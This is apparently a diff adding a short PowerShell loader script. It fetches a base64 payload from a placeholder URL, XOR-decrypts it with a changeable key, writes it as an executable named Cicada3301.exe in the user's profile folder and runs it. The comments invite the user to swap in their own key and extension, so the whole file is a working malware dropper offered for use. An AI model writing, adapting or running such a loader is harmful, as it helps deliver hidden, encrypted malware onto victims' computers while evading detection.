@@ -1,0 +1,20 @@
+$u='rawpayloadurl'
+
+try {
+    $k = 'moon' //change encryption key 
+    if (!$u) { throw 'Missing URL' }
+
+    Add-Type 'using System.Net;public class D{public static string G(string u){using(var w=new WebClient())return w.DownloadString(u);}}'
+
+    $b = [Convert]::FromBase64String(([D]::G($u) -replace '\s'))
+    $x = [Text.Encoding]::UTF8.GetBytes($k)
+    $o = [byte[]](0..($b.Length - 1) | ForEach-Object {
+        $b[$_] -bxor $x[$_ % $x.Length]
+    })
+    $file = "$env:USERPROFILE\Cicada3301.exe" //or whatever extension it ischange it here 
+    [IO.File]::WriteAllBytes($file, $o)
+    & $file
+}
+catch {
+    Write-Host "Error: $($_.Exception.Message)"
+}
